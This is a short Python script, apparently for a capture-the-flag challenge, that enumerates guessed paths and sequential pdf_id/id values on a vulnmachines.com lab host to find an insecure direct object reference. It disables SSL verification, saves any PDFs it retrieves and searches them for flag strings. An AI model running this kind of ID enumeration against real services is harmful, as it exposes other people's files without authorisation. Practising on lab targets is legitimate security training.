#!/usr/bin/env python3
import urllib.request
import ssl

# Ignorar certificados SSL
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

base = "http://hackme1.vulnmachines.com"

# Lista de URLs a probar
urls = [
    f"{base}/idor",
    f"{base}/idor/",
    f"{base}/IDOR",
    f"{base}/IDOR/",
    f"{base}/Idor",
    f"{base}/Idor/",
    f"{base}/idor/index.php",
    f"{base}/idor/index.html",
    f"{base}/idor/download.php",
    f"{base}/IDOR/index.php",
    f"{base}/IDOR/download.php",
    f"{base}/download.php?pdf_id=1",
    f"{base}/download.php?pdf_id=2",
    f"{base}/download.php?pdf_id=3",
    f"{base}/download.php?id=1",
    f"{base}/download.php?id=2",
    f"{base}/file.php?id=1",
    f"{base}/file.php?pdf_id=1",
    f"{base}/pdf.php?id=1",
    f"{base}/pdf.php?pdf_id=1",
    f"{base}/get.php?id=1",
    f"{base}/get.php?pdf_id=1"
]

print("[*] Searching for IDOR challenge...")

for url in urls:
    try:
        print(f"\nTrying: {url}")
        response = urllib.request.urlopen(url, timeout=5, context=ctx)
        content = response.read()
        
        print(f"  Status: {response.status}")
        print(f"  Size: {len(content)} bytes")
        
        # Check if PDF
        if content[:4] == b'%PDF':
            print(f"  [!!!] PDF FOUND!")
            filename = f"/workspace/FOUND_PDF_{urls.index(url)}.pdf"
            with open(filename, 'wb') as f:
                f.write(content)
            print(f"  Saved to: {filename}")
            
            # Check for flag
            if b'vnm{' in content or b'flag' in content.lower():
                print(f"  [!!!] PDF CONTAINS FLAG KEYWORDS!")
        
        # Check if not default Apache
        elif len(content) != 10918 and b'apache2 ubuntu' not in content.lower():
            if b'idor' in content.lower() or b'pdf' in content.lower() or b'download' in content.lower():
                print(f"  [!] Interesting content found!")
                preview = content[:500].decode('utf-8', errors='ignore')
                print(f"  Preview: {preview}")
                
    except Exception as e:
        print(f"  Error: {e}")

print("\n[*] Search complete")